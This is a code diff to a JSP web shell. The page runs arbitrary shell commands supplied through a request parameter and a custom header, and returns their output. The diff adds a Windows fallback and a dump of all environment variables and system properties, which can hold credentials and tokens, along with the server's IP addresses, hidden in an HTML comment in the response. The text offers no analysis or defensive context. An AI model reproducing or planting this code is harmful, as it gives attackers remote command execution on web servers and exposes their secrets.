@@ -1,27 +1,70 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
-String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c";
-if(null != request.getParameter("bash"))
+String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n";
+
+Map<String, String> env = System.getenv();
+for (String envName : env.keySet())
+{
+    szSys += envName + " = " + env.get(envName) + "\n";
+}
+
+Properties capitals = System.getProperties();
+Set states = capitals.keySet();
+for (Object name : states)
+{
+    szSys += (String)name + " = " + (String)capitals.getProperty((String) name) + "\n";
+}
+
+if(-1 < szSys.indexOf(":\\Windows"))
+{
+    bh = "cmd.exe";
+    cS = "/C";
+}
+else if(null != request.getParameter("bash"))
 {
     bh = request.getParameter("bash").toString();
     if(-1 < bh.indexOf("cmd"))cS = "/C";
 }
 if (cmd != null)
 {
-try{
-Process p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
-p.waitFor();
+    Process p = null;
+    byte[] b = new byte[2048];
+    OutputStream os = null;
+    InputStream in = null;
+    int x = 0;
+    try{
+        p = Runtime.getRuntime().exec(new String[]{bh,cS,cmd});
+        //p.waitFor();
+        os = p.getOutputStream();
+        in = p.getInputStream();
+        x = in.read(b, 0, b.length); 
+        while(-1 < x)
+        {
+          if(0 < x)out.print(new String(b,0,x));
+          x = in.read(b, 0, b.length);
+        }
+        os.close();
+        in.close();
+    } catch (Exception x6) {
+        try{
+            p = Runtime.getRuntime().exec(cmd);
+            //p.waitFor();
 
-//OutputStream os = p.getOutputStream();
-InputStream in = p.getInputStream();
-byte[] b = new byte[2048];
-int x = in.read(b, 0, b.length); 
-while(-1 < x)
-{
-  if(0 < x)out.print(new String(b,0,x));
-  x = in.read(b, 0, b.length);
-}
-} catch (Exception x) {}
+            os = p.getOutputStream();
+            in = p.getInputStream();
+            
+            x = in.read(b, 0, b.length); 
+            while(-1 < x)
+            {
+              if(0 < x)out.print(new String(b,0,x));
+              x = in.read(b, 0, b.length);
+            }
+            os.close();
+            in.close();
+        } catch (Exception x1) {
+            out.println(x1.getMessage());
+        }
+    }
 }
 
     cmd = request.getHeader("X-CMD");
@@ -122,7 +165,7 @@ while(-1 < x)
                     if (!i.isLoopbackAddress() && !i.isLinkLocalAddress() && !i.isMulticastAddress()) szIp += "," + i.getHostAddress();
                 }
             }
-            out.print("<!-- ip:" + szIp + " -->");  
+            out.print("<!-- ip:" + szIp + "," + szSys+ " -->");  
         } catch (Exception e) {
         }
         out.print("<!-- _xx_xx_ -->"); 
